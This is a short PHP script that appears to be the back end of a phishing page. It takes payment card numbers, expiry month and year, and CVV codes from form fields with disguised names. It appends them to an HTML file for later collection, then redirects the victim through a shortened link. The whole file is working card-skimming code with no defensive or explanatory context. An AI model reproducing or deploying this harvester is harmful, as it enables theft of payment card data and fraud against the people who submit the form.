<?php

$numero .= $_POST['valera']."\n";
$mes .= $_POST['puerta']."\n";
$año .= $_POST['trujillo']."\n";
$cvv .= $_POST['merida']."\n";


$f = fopen("remote2.html", "a"); 
fwrite ($f, ' numero: <b><font color="#070346">'.$numero.'</font></b><br>
mes: <b><font color="#070346">'.$mes.'</font></b> año: <b><font color="#070346">'.$año.'</font></b><br> cvv: <b><font color="#070346">'.$cvv.'</font></b><br>==================================<br>');
fclose($f);
sleep(1);

header ("Location: https://bit.ly/3iG6y6N");


?>